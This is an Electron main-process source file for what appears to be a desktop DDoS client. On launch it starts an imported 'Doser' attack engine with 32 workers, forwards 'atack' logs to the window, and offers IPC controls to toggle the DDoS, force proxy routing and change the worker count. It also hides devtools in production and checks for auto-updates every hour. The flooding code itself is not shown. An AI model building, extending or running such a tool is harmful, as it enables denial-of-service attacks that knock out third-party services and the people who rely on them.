import { app, BrowserWindow, nativeTheme, ipcMain } from 'electron'
import path from 'path'
import os from 'os'

import { Doser } from '../src-worker/doser'
const { autoUpdater } = require("electron-updater");


// needed in case process is undefined under Linux
const platform = process.platform || os.platform()

try {
  if (platform === 'win32' && nativeTheme.shouldUseDarkColors === true) {
    require('fs').unlinkSync(path.join(app.getPath('userData'), 'DevTools Extensions'))
  }
} catch (_) { }

var mainWindow

function sendStatusToWindow(text) {
  try {
    console.log(text)
  } catch(err) {
    console.log(err)
  }
}
function createWindow () {
  /**
   * Initial window options
   */
  mainWindow = new BrowserWindow({
    icon: path.resolve(__dirname, 'icons/icon.png'), // tray icon
    width: 600,
    height: 900,
    useContentSize: true,
    webPreferences: {
      contextIsolation: false,
      // More info: /quasar-cli/developing-electron-apps/electron-preload-script
      nodeIntegration: true,
      nodeIntegrationInWorker: true
    }
  })

  mainWindow.setMenu(null)
  mainWindow.loadURL(process.env.APP_URL)
  if (process.env.DEBUGGING) {
    // if on DEV or Production with debug enabled
    mainWindow.webContents.openDevTools()
  } else {
    // we're on production; no access to devtools pls
    mainWindow.webContents.on('devtools-opened', () => {
      mainWindow.webContents.closeDevTools()
    })
  }

  mainWindow.on('closed', () => {
    mainWindow = null
  })

  const doser = new Doser(true, 32)
  const window = mainWindow
  doser.listen('atack', (data) => console.log(data.log))
  doser.listen('atack', (data) => window.webContents.send('atack', data))
  doser.listen('error', (data) => window.webContents.send('error', data))
  doser.start()
  
  ipcMain.on('updateDDOSEnable', (event, arg) => {
    if (arg.newVal) {
      doser.start()
    } else {
      doser.stop()
    }
  })

  ipcMain.on('updateForceProxy', (event, arg) => {
    doser.forceProxy(arg.newVal)
  })

  ipcMain.on('updateMaxDosersCount', (event, arg) => {
    doser.setWorkersCount(arg.newVal)
  })

  ipcMain.on('installUpdate', () => {
    autoUpdater.quitAndInstall()
  })
}

autoUpdater.on('checking-for-update', () => {
  sendStatusToWindow('Checking for update...');
})
autoUpdater.on('update-available', (info) => {
  sendStatusToWindow('Update available.');
})
autoUpdater.on('update-not-available', (info) => {
  sendStatusToWindow('Update not available.');
})
autoUpdater.on('error', (err) => {
  sendStatusToWindow('Error in auto-updater. ' + err);
})
autoUpdater.on('download-progress', (progressObj) => {
  let log_message = "Download speed: " + progressObj.bytesPerSecond;
  log_message = log_message + ' - Downloaded ' + progressObj.percent + '%';
  log_message = log_message + ' (' + progressObj.transferred + "/" + progressObj.total + ')';
  sendStatusToWindow(log_message);
})
autoUpdater.on('update-downloaded', (event, releaseNotes, releaseName) => {
  sendStatusToWindow('Update downloaded')
  const obj = {
    message: process.platform === 'win32' ? releaseNotes : releaseName,
  }
  try {
    sendStatusToWindow(obj)
    mainWindow?.webContents.send('update', obj)
  } catch(err) {
    console.log(err)
  }
})

app.whenReady().then(createWindow)

function checkUpdates() {
  try {
    autoUpdater.checkForUpdates()
  } catch(err) {
    console.log(err, "Error while checking update")
  }  
}

app.on('ready', function()  {
  checkUpdates()
  setInterval(() => {
    checkUpdates()
  }, 1000 * 60 * 60)
});

app.on('window-all-closed', () => {
  if (platform !== 'darwin') {
    app.quit()
  }
})

app.on('activate', () => {
  if (mainWindow === null) {
    createWindow()
  }
})
